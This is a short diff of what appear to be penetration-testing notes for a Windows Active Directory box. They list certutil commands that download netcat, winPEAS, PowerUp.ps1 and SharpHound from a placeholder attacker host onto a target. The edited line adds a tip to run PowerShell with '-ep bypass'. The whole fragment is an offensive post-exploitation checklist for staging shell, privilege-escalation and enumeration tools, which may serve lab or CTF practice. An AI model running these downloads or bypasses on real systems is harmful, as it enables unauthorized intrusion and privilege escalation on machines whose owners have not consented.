@@ -8,7 +8,7 @@ DOWNLOAD THE FOLLOWING FILES. FOLLOW ALL OF THESE DOWNLOADS, GO FOR EASIEST WINS
 
  - certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
  - certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
- - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1 --
+ - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1 -- Note: need to run powershell -ep bypass for this to work.
  - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe -- Note: if ldap isn't enabled bloodhound output will suck.
 
 Sharphound should hold all of the AD enumeration needed for this box.
